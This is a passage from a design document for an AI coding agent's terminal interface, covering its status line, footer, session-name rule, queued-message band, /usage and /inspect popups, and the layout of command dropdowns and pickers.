`thinking · 21m 03s` of a moment ago reads `thinking · quiet · 21m 03s`, with the inserted `· quiet`
in the scheme's amber `warning` role. The row keeps ONE clock, and it is the activity's: in the case
this was built for nothing arrived after the request went out, so the silence and the phrase are the
same span and a second duration behind the word would state that one fact twice — and the clock
never jumps backwards when the word appears or clears. `ui.stall-after` is the threshold the silence
has to cross — `90s` by default, `0` turns it off — and what it measures is the time since the last
engine event of any kind arrived, so the word appears by itself and disappears by itself the moment
one does. It is a fact and not a verdict: a large prompt is legitimately silent for a minute or two,
so the row reports the silence and says nothing about what it means. Only `thinking` and
`responding` carry it — a silent tool call is the tool taking its time, and a stop already says what
it is doing — and the states waiting on a human (an open question, an approval) never do, the
silence there being the human's own. It is also the first thing the left slot gives up when the row
is tight, dropped whole rather than truncated.

---

## The status line's right slot

**Where it ends.** The right end of the status line is one slot that its occupants take in turn —
the context-usage gauge (`16k/32k 50% █████░░░░░` in the sketch above — the tokens used out of the
window they are measured against, because a fill only means something beside the limit it fills,
and where `░` draws the empty half of the ten-cell track: on screen those cells are a painted
dark-gray field carrying no glyph of their own), the key hint that stands in for it (`esc stop`
while a turn runs, `enter dismiss` after an error, the primed-`ctrl+c` line), and the mouse-copy
flash. Whichever one is showing, it
ends **two columns short of the window edge** (`bodyIndent`) — the mirror of the two columns the
left slot leads with, and the same column the footer's mode marker below it ends in, so the
gauge's last track cell in the sketch sits directly above the last character of `ask before`. The
margin belongs to the slot, not to any one occupant: the gauge and every hint end in that column,
and nothing in the slot ever touches the edge. The black field runs past it to the edge
regardless — the row is one unbroken band, as it is on the left. In a window too narrow to hold
both slots the right one is dropped whole rather than squeezed, two columns sooner than it used
to be.

**How a size is spelled.** Every context size on screen goes through one formatter — both halves
of the gauge, the sub-agent block's middle cell, the startup box's window, the rebind and
heartbeat notes, the `— 32k` gloss in the pickers — so the whole frame states a window in one
language rather than each site inventing its own. It counts in **binary steps of 1024** and wears
the plain suffixes `k`, `M`, `G`, because the windows themselves are powers of two and the models
are named for them: `32768` reads `32k` and `131072` reads `128k`, which is what the reader was
told they bought. The accepted price of the binary step is that a decimal round number does not
stay round — `128000` reads `125k`. The unit is then chosen so that **the displayed number never
reaches a thousand**: it steps up rather than running on, so `999k` is the largest thing `k` ever
spells and a million-token window reads `1M`, never `1024k`. `k` is always a whole number (`2k`,
`32k`, `977k`); `M` and `G` carry one decimal only while it says something (`1.1M`, against `1M`
and `15M`); anything under a thousand is just itself (`999`). A size that is **not known** is
spelled as nothing at all — the empty string is the sentinel, which is why a cell or a row with no
reading behind it disappears instead of painting a `0`. One reading wants finer grain and gets one
decimal in every unit (`~4.1k`, `~32.0k`): the standing-content note that fires when the system
prompt and the context files overrun their Budget share, where a measured count is set against a
limit the coarse form would round it onto. File sizes are a different domain and keep their own
`KiB`/`MiB`.

**And what the left slot sheds.** The left slot carries the state's own words — the running phrase
and its clock, `approval needed`, `answer needed`, `error` — and after them the `N queued` count of
what is waiting to go out. It is composed **to** the window's width, in the order it is read for,
exactly as a pane's title row is: the **count** is the last thing it gives up and the **phrase** is
what is trimmed around it (`⣾ read… · 5 queued` at 20 columns), because on the short windows where
the band has been dropped that count is the only thing the whole frame says about the queue. Below
two columns of room the phrase goes whole, separator and all, rather than reading as an ellipsis.
The trimming is now the rare case rather than the ordinary one: a running phrase is a **verb and a
clock** (`reading · 3s`) since the tool's target left this slot, so on any window with room for the
gauge it arrives whole — which is the point of it having left. The order above is what happens on
the windows narrow enough that something must still give.

**And the two facts an *idle* frame may still carry.** Idle otherwise says nothing for itself — the
input box below already invites a message — but the slot is where a surface that has gone leaves its
fact, and two of them are owed at idle. The first is the `/settings` pane's `settings — esc close`
(above), for a window that could seat none of it. The second belongs to the **session** rather than
to a pane: a run that started with **no server bound** — nothing recorded to start on, a `server:`
naming an entry that is gone, or nothing configured at all (ADR 0036) — carries its state here for
as long as that holds. With entries to choose between it reads `no server bound — /server to
choose`, and with none it reads `no servers configured — add one to ~/.apogee/config.yaml and
restart`: the state, and the one act that ends it. Such a run opens by ASKING — the `/server` picker
under a notice saying why it came up unasked, or `/settings` when there is nothing to pick and the
read-only `servers` row is the pointer — and the fact is what survives the `esc` that closes that
pane, so a frame the human dismissed the question on never looks like an ordinary idle session. The
pane's fact wins where both are owed, being the more urgent of the two: a modal is swallowing every
keypress on a window showing none of it, and the session's fact is still there when it closes. The
fact goes the moment a server is bound.

---

## The footer's upstream slot

**What it carries.** The footer's content row states the upstream on the left — `host ✦ model ✦
workdir`, the sketch's `workstation ✦ qwen3.6-27B-Q4_K_S.gguf ✦ ~/Repos/apogee` — and the autonomy
mode on the right. The host is the bound `servers:` entry's own name — the name IS a server's alias
(ADR 0036 decision 1) — falling back to the endpoint's own host for the unlisted `--endpoint` start
that has no name, and any segment nothing has named is dropped with its separator.

**The mode marker's symbol.** The mode is stated as a glyph and its word, one rung per shape:
`⊞ plan`, `◐ ask before`, `✔ allow edits`, `⏵⏵ auto`. The glyph is rendered in the SAME styled run
as the word, so it carries the mode's own colour by construction rather than by being coloured to
match — there is no separately toned badge here, and no way for the two halves to drift apart. The
symbol belongs to the marker alone: everywhere the mode is said in a sentence instead (the
confinement overlay's "the current mode is ask before") it is the word by itself, where a glyph
would only be noise. A mode off the ladder states its word with no glyph rather than borrowing
another rung's shape.

**What it is.** ONE frameless row below the prompt box, which closes its own `╰─╯` frame. The
footer used to be three rows of chrome — a `├──┤` divider standing in for the edge the box was
missing, the content between two `│` bars, and a `╰──╯` rule under it — and it now takes the
**status line's** posture instead, one row below the box rather than one row above it: the two-column
`bodyIndent` lead, one unbroken black field to the window's full width, and the mode marker ending
`bodyIndent` short of the edge — the same column the gauge ends in (above). A window too narrow for
both ends keeps the older shape: the left info truncates with an ellipsis and the mode drops whole,
because a clipped mode word would name a blast radius the session is not in.

**And the hairline under it.** The footer is the last thing the frame *says*, but it is not the last
row: a `▁` hairline closes the screen beneath it — the `▔` at the top of the bottom chrome
**inverted** (upper one-eighth block against lower), in the same recessive dim tone, so the whole
bottom section is bracketed by one rule above the status line and its mirror below the footer. It is
what the footer's old `╰──╯` left behind, and it is deliberately a RULE rather than a border: it
belongs to the chrome as a whole, not to the one row above it, which is why it closes the screen
without re-boxing the footer. Without it the workdir line sat flush against the terminal's last row
with nothing under it, and read as cut off rather than as light.

**Where the window went.** The context window used to close that run, and it does not any more:
the status line's gauge states it, beside what the conversation has actually spent
(`8k/98k 8% █░░░░░`), which is the only place the number tells the reader something that changes.
The window is still a session fact — a change to it is still noted in the transcript — it simply
has one home in the chrome now. It keeps exactly one: the fill a collapsed sub-agent run states on
its summary line is a *different agent's* window said on that run's own block, which is transcript
content and not a second gauge — the chrome gains nothing from a delegate having run.

**The workdir the slot ends on.** The last segment is the local directory this session is rooted
in, written with the home directory as `~` (`~/Repos/apogee`). The substitution happens only at a
component boundary, so a sibling that merely opens with home's spelling stays whole — the same
boundary rule the tool cards' workspace shortening uses. It is resolved once, at start-up, and is
the one fact in the slot that no upstream state can change: it sits **after** the model precisely
so the line reads outward-in — the server, the model on it, and last the directory here.

**The words that stand in for a model.** The model is replaced whenever there is no binding to
report, and only ever by one word. It is the **model segment alone** that gives way: the host is
where the session is still trying to reach, and the workdir is a local fact, so both stay put
behind the stand-in word.

- `connecting…` while a wired heartbeat has not bound a model: the seconds between the first paint
  and the first landed beat, and again after a `/server` switch until the new server answers.
- `loading <profile>…` while a profile load is in flight. It **outranks** `connecting…`, and
  it replaces a model that is still bound, because the launcher is in the middle of invalidating
  that binding and the profile being waited on is the more specific truth. `/unload-model` and
  `/stop-server` show `unload-model…` and `stop-server…` the same way — neither has a profile to
  name, so the slot spells the verb the human typed back at them.

The slot holds one word at a time and says nothing else: an actuation's own progress steps are
transcript notes, not chrome. The `✦ offline` marker is separate again — it is *appended* to the
**end** of the left slot in the error tone once the offline crossing is made, after the workdir and
whatever the model segment is showing, so it closes the line rather than displacing a fact.

---

## The top rule wears the session's name

**What it says.** The `▔` hairline that caps the bottom chrome carries the session's name, centered,
in place of the rule runes it would otherwise draw there — `▔▔▔▔ the name ▔▔▔▔`, as the sketch at the
top of this file shows it. The shape is `<▔ run><space><name><space><▔ run>`, the two spaces always
present so the name never touches a rule rune, and the three pieces together measure exactly the
window's width. It costs the frame no row: the rule already existed and already spanned the window,
so the name rides a row the transcript had already paid for and the row inventory above is unchanged.
**The only thing that clips the name is the room the rule leaves.** There is no fixed maximum: three
`▔` cells and one space stay on EACH side, always — that is what makes the row read as a rule
*carrying* a name rather than as a caption with two stubs — which fixes the name's room at `w - 8`. A
name is shown WHOLE whenever it fits, however long it is, and is truncated with an `…` only when it
would not, so a short name in a wide window keeps its long `▔` runs. It is the runs that flex, not
the name that shrinks to some arbitrary number. The truncation is in **cells**, like every other
width in this document and unlike a rune count, because this row is painted into the cell buffer: a
CJK name gives up half as many glyphs to fit the same room, and a rune-based clip would overrun the
window on exactly those names. The fill the label does not spend is split with the lead run taking
half rounded down, so on an odd fill the name sits one column left of dead centre — a reader who
counts columns would otherwise take that for a bug.

**Which name.** Two answers, in the order a session acquires them: the name the automatic naming call
or either form of `/rename` decided, and failing that the same first-prompt heuristic the first save
stamps, which names the rule from the human's opening request the instant it is sent — hours before a
naming call can answer. The gate on that second branch is "the transcript has a first user text", not
"the heuristic returned something": the heuristic answers a dated `Session <date>` for a session that
has said nothing, and a rule naming the calendar would be worse than a rule naming nothing. A session
that HAS spoken keeps whatever the heuristic makes of it, dated fallback included — that is the title
its record carries, and the rule agreeing with the `/sessions` browser is the point.

**What an unnamed session gets.** The plain unbroken rule, with no placeholder in the name's slot —
not `apogee`, not anything else. The rule is a rule that carries a name when there is one, and the
frame is already unmistakably this program's from every other row, so a stand-in would be noise on
the one row that has nothing to say yet. `/clear` therefore returns the row to a plain rule with the
session it starts.

**What it deliberately does not say.** No spinner, no clock, no working marker. The row states an
IDENTITY — which conversation this is, for a human scanning a screen full of panes — and a row that
changed every frame would be a gauge in the place the reader uses to tell one window from another.
Everything live already has a home in the chrome below it, one row down.

**How it degrades.** Below six cells a name is not a name, it is an ellipsis with a hint, so when
`w - 8` falls under six the row degrades to the plain unbroken rule rather than showing a stub. The
boundary is crisp: `w = 13` is a plain rule, `w = 14` carries a six-cell name between two three-cell
runs. A zero-width frame — reachable before the first size message lands — paints no row at all.

**The strip.** The name is untrusted twice over: it is a model's reply to the naming call, and it is a
stored record's title read back off disk, which nothing sanitizes on the way in. It goes through the
same strong strip the naming pipeline uses (whole escape sequences AND every non-whitespace control
character) and then has its whitespace runs collapsed, so a pasted multi-line name occupies one row
rather than smuggling a newline into the frame. Here a control character is a LAYOUT bug as much as a
security one: it breaks the row's measure, and every row of this frame is squared to the window.

---

## The staged-interjection band

**What it shows, and when.** A message typed while the agent is working is *staged*, not sent: it
waits its turn and goes out at the next safe seam. Every staged message waiting to go out shows as
one row in a band sitting directly above the input box — the slot closest to the box, below the
status line. The band exists only while something is queued, in whichever state holds it: a live
queue draining as the agent runs, or a queue held over at idle after a stop. An empty queue paints
nothing at all — no rows, and no frame either.

**One group, framed.** The rows are one contiguous block, never interleaved with other chrome, and
the group is framed by one blank band row above and one below so it reads as its own object between
the status line and the box. The frame belongs to the band: it appears and disappears with it.

**Painted edge to edge.** Every row of the band — the content rows and the two blank framing rows
alike — is faint text on a black field spanning the **full window width**. A row is clipped
ANSI-aware to the window with a `…` tail and then padded back out to that same width, so the black
runs to both edges and the terminal's own background never shows through past the text. The input
box directly beneath has the same black interior, so band and box read as one joined block of
chrome — the status line's posture, one row up.

**A row.** `  ⧖ message`: two spaces of indent (`bodyIndent` — the same body column the status
line's text and the transcript's own body sit in, so the ⧖ lines up with the spinner column above),
the ⧖ staged-interjection marker, one space, then the message flattened to a single line (runs of
whitespace collapse to one space) as a preview. The message itself is untouched; this is only how a
waiting row is shown.

**Order and cap.** Rows are in delivery order, oldest first — so the row nearest the input box is
the newest, the one Backspace takes back. At most three content rows show at once
(`maxQueuedRows`); the strip steals its height from the transcript viewport, so an unbounded queue
would squeeze the conversation off the screen. Past the cap the **newest** rows are the ones kept
and a `  … N more queued` marker rides at the top of the group, inside the frame and indented and
painted like every other row, so the count says nothing was dropped. The worst case on screen is
six rows: the cap, the marker, and the two framing rows.

**The cap is the band's taste; the frame's row budget is the answer to it** (the section on height
above). The band is one of the surfaces sharing the rows above the input box, and it gives way
before any pane does, so a short window — or an open pane beside it — cuts it below three rows and
sometimes to none. What the budget drops is counted in **the same** `… N more queued` marker the
cap overflows into, one wording for one fact, and the marker outranks the rows it describes: a band
with one row to spend spends it on the count, not on one of five. Below three rows there is no
honest band left — its frame, one row and a marker do not fit — so it is not drawn at all, and the
status line's `N queued` readout is what carries the count, as it does in every frame the band
appears in.

**What the band is not.** Once a staged message is delivered it leaves the band and appears in the
transcript as its own ⧖ block, which keeps the transcript's own look. The status line's `N queued`
readout is separate too, and reads the same count from the same queue.

---

## The `/usage` popup

**What it answers, and why the gauge cannot.** `/usage` opens a bordered pane in the transcript-side
slot, listing what this session has **spent**: one row for the main agent, one for every sub-agent
that reported a count, and a session total. The status gauge is a *fill* — how full the window
stands right now — and a fill says nothing about the tokens a long run burned through and compacted
away, nor anything at all about a delegate whose window closed when its run ended. Both readings are
on the screen for the same session and they are different questions.

**Six columns, one row per agent.** `agent · calls · prompt · completion · total · ctx`, under a
header row painted a weight above the rows so the labels are found without being read. `main` comes
first, then each delegate **in transcript order** — indented under it, named by the delegation's own
name or, unnamed, the first line of its task, clipped where it is longer than the column — and last
a `session` row, the agents above it added up. The counts are spelled in the coarse form the gauge
and a run's own reading already use (`21k`), a zero leaving its cell empty rather than printing a
`0` the column has to be scanned past; the `ctx` cell is the percentage the gauge labels its bar
with, clamped at 100 exactly as that one is. Two facts have no cell: a delegate that reported no
fill leaves `ctx` blank, because a fill without its limit is a number with no scale, and the
`session` row leaves it blank always, because two windows do not add up to a third.

**The total row appears only where there is something to total.** With no delegate the main row IS
the session, and a second row restating it would be noise. A delegate that never reported a count is
not listed at all: a run whose child got no usage back is a fact about the server rather than a
spend, and a row of empty cells under the totals would read as one.

**Nothing counted yet is a sentence, not an empty table.** Before any completion has come back with
a token count — a fresh session, or a server that omits usage — the pane shows one line of prose
saying so, with no header row and no columns.

**The pointer dismisses it, and the wheel scrolls it.** A click **outside** the box dismisses
the report — and, because the pane is not modal, that click still lands where it was aimed: it seats
the caret in the prompt or starts a transcript selection exactly as it would have with no report up. A
click **inside** the box does nothing at all, and is swallowed rather than dragging a selection across
the transcript drawn under it. The **wheel** scrolls the rows one notch at a time where a session fanned
out to more delegates than the pane was granted rows for, clamped at both ends — a scroll must not roll
past the last row and land back on the first — and the column header scrolls with them, being a row of
the list like any other.

**The keyboard scrolls the same rows.** `↑`/`↓` move the window a row and `PgUp`/`PgDn` a whole
window, through the same window and the same two ends the wheel stops at — the first row, and the
last FULL one — so a reader with no mouse is never left with a report they cannot see the bottom of,
and the two ways in cannot disagree about which rows are on the screen. The hint under the rows reads
`↑/↓ scroll · esc close`. While the report is up the page keys are ITS, not the transcript's: the
conversation behind the pane is the one list the human is not reading, and a `PgDn` that moved it
would scroll what is hidden.

**It is the lightest pane in the frame.** No filter, no selection, and no keys but `esc` and those
four: it is a question already answered rather than a decision surface, so the input box behind it
stays live and every other key — a printable one included — goes where it always went. Its verb is safe while the agent works — the pane reads
what the frame already holds and calls nothing — which is exactly when the question gets asked, so
it is the one pane that can be up beside an approval or ask prompt, seated below it, nearest the
chrome. In the give-way order it sits between the `/settings` pane and the `/inspect` pane: it
yields to every surface the human is acting **in**, and the two panes below it — the raw-protocol
view, and the dropdown the next keystroke re-derives — yield before it.

---

## The `/inspect` popup

**What it shows.** `/inspect` opens a bordered pane in the same transcript-side slot, listing the
**raw protocol** of the recent model calls: the request body the engine marshalled and the response
payload it read back, newest last. It is the view for the question the rendered conversation cannot
answer — the model behaved in a way the transcript does not explain — and the only thing that
settles that is the bytes.

**It is armed, and off by default.** The engine captures nothing unless the `ui.inspector` config
key says so, read once at start-up, so a session that never asks for it pays nothing at all. With
nothing captured the pane draws one row rather than an empty box: the key's name where the capture
is off, and "armed — the next model call lands here" where it is on. Those are different answers to
the same silence and only one of them is actionable.

**A bounded ring, oldest first.** The pane holds the twenty most recent halves of a round-trip, each
headed `request · turn 2` — with `· depth 1` on a delegated run's traffic — and its payload
pretty-printed under it. A record longer than a hundred lines keeps its head and closes with the
same `… (+N more lines)` every other elided block carries, so the cut is stated rather than made
silently. Payload rows are **flat**: a line wider than the pane is clipped at the border like any
other unwrapped row, because a wrapped one long enough to outgrow the whole window would seat
nothing at all, and a raw-protocol view that goes blank on a big request body is worse than one that
cuts a long line short.

**It opens on the newest record.** The rows are a log's order, so the record worth reading is the
last one; the pane opens on the last full window and the keys move from there. Its keyboard is the
`/usage` report's exactly — `esc`, `↑`/`↓` by a row, `PgUp`/`PgDn` by a window, and nothing else —
and it is non-modal on the same terms: the box behind it stays live and every other key goes where
it always went. Its verb is safe while the agent works, which is when the traffic worth reading is
being made.

**The pointer works on it exactly as it does on the report.** A click **outside** the box dismisses
the pane and still lands where it was aimed, a click **inside** does nothing and is swallowed rather
than dragging a selection across the transcript drawn under it, and the **wheel** scrolls the record
list one row per notch, clamped at the first row and the last full window — the two ends the keys
stop at. The report is asked first where both are up, so a click on this pane dismisses the report
above it and is then swallowed here.

---

## The prompt box's mini-language

**One dropdown for `/`.** Typing a `/` token opens ONE suggestion pane above the box — the same
bordered, titled pane the `/sessions` browser and the approval prompt use, in the slot that
shrinks the transcript to make room. It is titled `commands and skills` and it lists both:
commands, prefix-matched, each with its one-line summary; and skills, matched on id and
display name, each row led by the `✦` skill glyph so the two kinds never read alike. `@` opens the
same pane over workspace files. At most eight rows show — and fewer than eight when the window
cannot spare eight, because the dropdown answers to the same row budget every pane does (the
section above): a short terminal scrolls a smaller window around the selected row, and one with no
rows to give counts the whole menu onto the title row rather than opening an empty pane under a
hint still offering `↑/↓ select`. The hint line under the rows reads
`↑/↓ select · ⏎/tab accept · esc dismiss`. The rows rank by **match quality** — an exact name
first, then the names the typed partial starts, then the ones that merely contain it — and rows of
equal quality keep the scan order behind the menu: the commands, alphabetically, and then the
skills in catalog order. A bare `/` therefore still reads alphabetically, because with nothing
typed every name ranks alike and nothing reorders, so the menu can be scanned without knowing the
tables behind it; a typed `imple`, though, puts `/implement-plan` above `/feature-implementation`,
because the row the human is reaching for should not sit under one that merely spells the same
letters somewhere inside. Every verb the parser knows is in it — `/stop-server` and `/unload-model`
included. Those two act on the session's own server and say so in their names, and a verb the human
cannot discover is a verb they will not find.

**A skill row says where the skill came from.** After its id, a skill row carries the source dir it
was loaded from — `✦ /clean-code · workspace` for one the opened project ships, `· library` for one
from the user's own `~/.apogee/skills`, `· elsewhere` for a dir neither root accounts for. It is the
one thing on the row a `SKILL.md` does not write for itself: the id, the display name and the
description are all the project's own text, and a skill that names and describes itself as a command
sorts *above* the verb it imitates. The source sits beside the id rather than after the description
because the description is the untrusted half and it is long — placed after it, a padded description
would push the disclosure off the pane's right edge. The same rule bounds the id itself: it renders
folded onto one line, its whitespace runs collapsed, clipped to 32 runes with a trailing `…`, so a
padded id can never paint as a short innocent token with its payload cut off at the edge. The
`/skills` report labels its loaded rows the same way, from the same renderer.

**Its rows are columns, not sentences.** A dropdown row is not one concatenated string. The name
and its one-line summary render as **vertically aligned columns**, each padded to the widest cell
in it, so every summary in the pane starts at the same screen column however long the verbs and
skill names beside them run — and in the merged `/` menu a skill's description is aligned against
the command summaries above it, so the two kinds read as one table rather than two lists stacked.
The busy-state `— idle only` tag is a column of its own after the summary, and it costs the pane
nothing while the engine is idle, because a column no row fills collapses away. `@`'s file rows
have one field and so no columns to align: they render exactly as they always did. The full rule
is the **Column contract** under "One overlay for 'which one?'" below, which governs every pop-up
pane alike — this dropdown, the pickers, and the `/sessions` browser.

**It follows the caret, not the end of the line.** The token being completed is the word the caret
stands in or immediately after — so a draft already in the box does not shut the menu out, and
going back to fix a misspelled skill id mid-message offers exactly the same menu the end of the
buffer does. Accepting splices over that token alone and puts the caret just after the splice;
everything on either side is untouched.

**Accepting a command RUNS it.** The `/verb` is cut out of the draft and the command fires; the
rest of what was typed stays in the box with the caret where it belongs. The verbs that need what
follows them are the exception and complete instead: the ones that take arguments — today
`/color-scheme`, `/confine`, `/rename` and `/schedule` (and arguments are only ever read from a
whole-line invocation). `/model` and `/server` take an argument too, but their bare form is a whole
verb — it opens a picker and changes nothing until that picker is accepted — so accepting their row
runs them like any other. Accepting a skill row writes that skill's own `/id ` token into the text.

**One overlay for "which one?".** `/model` and `/server` with nothing after them open a
picker: the same bordered pane as the `/sessions` browser, one row per choice, one highlight,
`type to filter · ↑/↓ select · ⏎ switch · esc close` under it, at most eight rows with a window
scrolling around the selection. It is modal — while it is open every key belongs to it. `/server` lists the servers
`config.yaml` names plus the one this session started on, in three columns — `name`, `— endpoint`,
`· current` — and the row the session is on is the one that fills the third, faintly; picking it
says so instead of switching. `/model` has
two offerings and lists whichever one the session's own server can answer from: while it is on a
`servers:` entry that names a llama-launcher config,
the Launch profiles that config defines, in the launcher's own order, in five columns — `name`,
`— backend`, `· 32k`, `(:8080)`, `· running` — where the port shows only for a profile that does
not live where this session is pointed and `· running` marks one that is live right now; on any
other entry, what the server currently advertises, in two columns — `model`, `— 32k` — refreshed in
place if a heartbeat lands underneath it. Either way what
the session is ALREADY on is not among the rows — there is no `· current` mark to pick, because
there is no row that would switch nothing, which is what makes the hint's `⏎ switch` true of every
row. Given an argument (`/model <name>`, `/server <name>`) the verb acts straight away and no pane
opens at all. When there is nothing to
pick — no monitor, an unreachable server, nothing advertised yet, nothing but the model already
bound, no `servers:` block, no launcher config where one was named, no profiles in it, only the
profile already loaded — the answer is one honest line in the transcript and no empty pane.

**Typing into that pane narrows it, and never reorders it.** Every printable key — letters, digits,
punctuation, the space bar — appends to the overlay's own filter, and there is no activation key to
press first: the pane is modal, so no letter is a verb inside it and all of them can be the
filter's. Nothing is typed into the prompt box while a pop-up is up, and the filter never touches
the draft standing in it. A row survives when the filter, lowercased, appears anywhere in that row's
cells joined by a single space — every cell counts, marker cells included, so `run` finds the live
profile by its `· running` mark as readily as by its name, and case never matters. The survivors
keep the offering's own order: the filter prunes and does nothing else, so no row is ever ranked up
out from under the highlight while the text grows. `⌫` takes back a character, and `esc` closes the
pane outright even mid-filter — one key, one meaning, so the legend's `esc close` is never
conditionally wrong. The filter dies with the overlay, so the next `/model` opens on the whole list
again. What has been typed shows under the title as `filter: qwen▌`, on a line of its own with a
blank line above and below it, and that line exists only while there is something in it — its
presence *is* the fact that the pane is filtered. A filter matching nothing leaves the pane open,
titled, with its filter line, no rows and no highlight for `⏎` to take: a visible filter over an
empty list has already said why it is empty, and `⌫` is the way back to a wider one. All three lines
are budgeted with the rest of the pane, and on a window too short for everything the **rows** are
what gives way — a list you cannot see all of is still being narrowed, while a filter you cannot see
is a pane that has stopped explaining itself. Only past that do the two blanks go, together (half a
pad moves the line instead of setting it off), and the `filter:` line itself is the last thing
standing before the pane is down to the chrome the four-row floor leaves it.

**The same overlay asks `/schedule`'s questions.** `/schedule <prompt>` with no cycle in the line
opens the cycle pane — two columns, `1m`, `— every minute` through `4h`, `— every 4 hours` — and,
once a row is taken, the mode pane in its place, opening on a cleared filter because a cycle's
letters are not a mode's: `plan` and `auto`, each with a `—` gloss of what it
means for an unattended run, and a third `· unavailable` cell on `auto` where this host's
Auto-eligibility ladder has closed it. That row is still offered and still selectable; taking it
prints the reason and leaves the pane open, so `plan` is one keypress away and the prompt need not
be retyped. `/schedule-stop` with more than one schedule live opens a third pane over them — `name`,
`— every 1h`, `· plan`, `· running` — and stops the row that is taken. None of the three switches
anything, so the hint under them reads `⏎ choose` and, for the stop pane, `⏎ stop`. They are the
only panes that open while the model is working, and they claim the keyboard there exactly as they
do at idle.

**And the same overlay makes the start-up's one offer about a key.** A `servers:` entry whose
`api-key:` is written out in the config file, on a machine whose own secret store apogee can both
write to and read back from, opens a pane nobody asked for — after the pre-bound ask, and never
beside it: a session with no server is asked that question alone, and this one simply comes back at
the next start-up. One note first, naming the entries and the store; then one pane per entry, titled
`key for <name> — move it into <store>?`, over three rows in two columns — `move it`, `— store it in
<store> and point the entry at it`; `not now`, `— leave the file alone; the offer comes back at the
next start-up`; `never for this entry`, `— record plaintext-key-ok: true and stop asking`. The hint
reads `⏎ choose`, because nothing here switches anything. Every answer prints one line saying what
was done and which file says so — a failed move included, since a key that did not move must never
look like one that did — and the next entry's pane opens where the last one closed. `esc` ends the
round outright: whatever is left is a `not now`, and nothing is written. On a machine with no such
store the pane never opens at all; the notice naming the entries and the manual alternatives goes to
stderr before the alternate screen, with the confinement warnings.

**The `/sessions` browser types too, which is why its verbs are chords.** The browser filters
exactly as those panes do — any printable key builds the same case-insensitive filter over the row's
cells, the same `filter: …▌` line stands under the title with a blank line at each end, `⌫` undoes
and `esc` closes — and its filter is composed *after* the workspace view, so it narrows whichever
scope the pane is showing. That is what moved the three letter verbs onto control chords: the hint
reads
`type to filter · ↑/↓ select · ⏎ resume · ^r rename · ^d delete · ^a this/all · esc close`, where
`^r` arms the rename buffer, `^d` arms the delete confirm and `^a` toggles this workspace against
all of them. A list in which `d` might delete is a list no name can be typed into, and the store of
saved sessions is exactly the place a human wants to type a name. The delete confirm's `y`/`n` and
the whole rename edit are untouched by any of it: they are modal surfaces inside the modal, and
nothing is filtered while one of them is up. Toggling the scope leaves the filter standing — it is
what the human is looking for, and the toggle only changes where they are looking — and re-derives
the rows under it. An empty *workspace* still states itself on its one unselectable note row,
`no sessions in this workspace — press ^a to see all`; a filter that matched nothing gets no such
row, for the reason the picker's zero-match pane gets none.

**A firing browses like any other session, and says whose it is.** Each run of a schedule saves a
record of its own, so it appears in the `/sessions` browser among the sessions the human held
themselves — tagged `· ⟳ <schedule>` inside its TITLE cell, after the workspace base the
all-workspaces view puts there. It is a qualifier of the title rather than a tier of its own, for
the reason the workspace base is: it says which standing instruction produced this run, and it is
the fact that survives a rename out of the `<schedule> — <HH:MM>` title a firing is saved under.
Nothing else about the row moves — it orders, resumes, renames and deletes like every other record,
and a record with no schedule identity renders exactly as it did before there were schedules.

**The Column contract.** Every one of those grammars is a row of **cells**, and the pop-up module —
not the code that produced the row — owns the alignment, alongside its marker, highlight, windowing
and truncation. A column is as wide as its widest cell measured in painted display cells (the width
authority again, so CJK and emoji count for what they occupy on screen, not for their runes), and
it is measured over **all** of the pane's rows rather than the eight in the window, so the columns
never shift under the eye while the selection scrolls. Adjacent columns are separated by a
**two-space** gutter and nothing else — no rule between them: the pane already carries a border of
its own, and a second stroke inside it would read as a grid. Each separator glyph leads the
cell it introduces rather than trailing the one before it — `— backend`, `· 32k`, `(:8080)` — so
the `—`, the `·` and the `(` line up down the pane as well as the words after them. Every pop-up
kind has a **fixed schema**: a tier a row does not state is an *empty cell*, which pads like any
other, so an unstated context window or a nameless backend cannot slide the tiers after it
sideways; and a column **no** row in the pane fills collapses away entirely, costing it neither
width nor gutter. The composed line is right-trimmed and then goes through the pane's ordinary
pipeline — the two-cell selection marker in front, the highlight bar across it, truncation to the
inner width with a trailing `…`. That truncation is **whole-row**, never column by column, so a
narrow terminal loses the rightmost tiers rather than scrambling the alignment of the ones still on
screen. A row with a single cell has no columns to align and renders exactly as it did before
columns existed: `@`'s file suggestions, an armed rename buffer in the `/sessions` browser, and a
single-select ask prompt's answers. The **approval prompt's rows are two-cell** — the option and its
`[a]`-style shortcut — so the letters stack into a right-hand column the module derives rather than
the prompt hand-pads, and a pane too narrow for both loses the shortcut cell off the right by the
same whole-row truncation every other grammar takes. The key it drew still answers the prompt. A
**multi-select ask prompt's rows are two-cell the other way round** — a `[x]`/`[ ]` box first, the
answer after it across the module's own two-space gutter — so the boxes stack into a left-hand
column nothing hand-pads, and an answer too long for the pane **wraps under its own label** rather
than under the box beside it: the continuation lines hang at the label's column, so one option still
reads as one block of prose instead of sliding back under a marker that says nothing about it. A
single-cell row measures a hanging indent of zero and wraps exactly where it always did. And a
block too narrow to hold a hanging marker **plus one text column** measures a hanging indent of zero
as well: the marker and the blank indent under it are **shed whole** and the text wraps flat at the
block's full width. Markers are never *squeezed* — the alternative is a two-column bullet prepended
to a wrap floored at one column, which draws three cells inside a two-cell block and breaks the
absolute width cap, the one rule no surface bends. It is the ladder the pane title above already
spends its width by: the mark that no longer fits is dropped, and the words keep the block. The rule
holds wherever a hang is composed — the transcript's markers and list bullets, a tool block's branch
and gutter, and these rows alike. The
**`/settings` pane's key rows are four-cell** — the key, its value, an `(env)`/`(flag)` mark where a
higher-precedence source beat the file, and a last tier carrying whatever else is true of the row:
the reason the last act on it was refused, else the answer to an act that landed and moved no row —
`· already on macStudio`, or the `· opened in your editor` of an editor started **detached**, which
opened in its own window and left this pane standing where it was — else the boundary note of an
edit that landed at a boundary this session will cross rather than at once
(`· applies at next clear`), else — on a row an environment variable or a flag is overriding — that
the override wins again at the next start, else
the `· ⏎ opens $EDITOR` or `· use /confine` pointer of a key this pane will not write. That
tier is one column rather than three because a row is only ever one of those things at a time, and
it and the mark before it both collapse away on a configuration with nothing overridden, nothing
read-only and nothing edited yet — the same collapse that costs the `/` menu nothing for its
`— idle only` tag. **A key this session changed here wears a ` *` on its value cell** — `false *` —
and nothing else: an edit applies on the `⏎` that persists it (ADR 0037), so there is no pending
value to point at and what is left worth saying is which rows were touched. Its **section headings
are single-cell rows**, so they sit at the pane's left
edge rather than inside the key column, and they are rows the module paints and the selection never
lands on; each opens on a **blank spacer row** — except the first, which the description header's own
closing blank already sets off — and is painted a weight **above** the faint rows under it, so the
divisions of a long list are found without being read. The row being **edited** is painted in the
edit tone across its whole width, which is how a row says it is the field. The pane's second step —
